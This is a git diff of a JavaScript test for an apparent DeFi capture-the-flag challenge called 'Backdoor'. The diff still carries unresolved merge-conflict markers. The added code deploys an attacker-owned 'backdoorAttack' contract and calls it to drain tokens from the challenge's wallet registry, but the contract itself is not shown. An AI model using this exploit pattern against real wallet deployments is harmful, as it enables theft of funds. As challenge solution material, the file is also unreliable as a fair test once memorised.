@@ -44,8 +44,21 @@ describe('[Challenge] Backdoor', function () {
         await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
     });
 
+<<<<<<< Updated upstream
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+=======
+    it('Exploit', async function () {
+        const attackMasterCopy = this.masterCopy.connect(attacker);
+        const attackWalletFactory = this.walletFactory.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackWalletRegistry = this.walletRegistry.connect(attacker);
+
+        const AttackFactory = await ethers.getContractFactory("backdoorAttack", attacker);
+        const attackContract = await AttackFactory.deploy(attackMasterCopy.address, attackWalletFactory.address, attackToken.address, attackWalletRegistry.address);
+
+        await attackContract.attack(users);
+>>>>>>> Stashed changes
     });
 
     after(async function () {
